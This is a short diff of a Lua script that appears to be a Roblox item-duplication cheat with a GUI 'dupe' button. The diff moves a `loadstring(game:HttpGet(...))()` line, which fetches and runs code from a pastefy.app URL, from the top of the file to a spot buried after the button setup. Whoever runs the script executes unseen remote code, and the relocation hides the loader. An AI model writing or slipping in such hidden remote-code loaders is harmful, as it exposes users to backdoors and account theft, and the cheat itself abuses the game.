@@ -1,5 +1,4 @@
 wait(0.2)
-loadstring(game:HttpGet("https://pastefy.app/mzQZnDar/raw"))()
 
 local Players = game:GetService("Players")
 local StarterGui = game:GetService("StarterGui")
@@ -82,6 +81,8 @@ dupeButton.TextColor3 = Color3.fromRGB(255, 255, 255)
 dupeButton.Font = Enum.Font.SourceSansBold
 dupeButton.TextSize = 20
 dupeButton.Parent = frame
+
+loadstring(game:HttpGet("https://pastefy.app/mzQZnDar/raw"))()
 
 local dupeNote = Instance.new("TextLabel")
 dupeNote.Size = UDim2.new(0.8, 0, 0.08, 0)
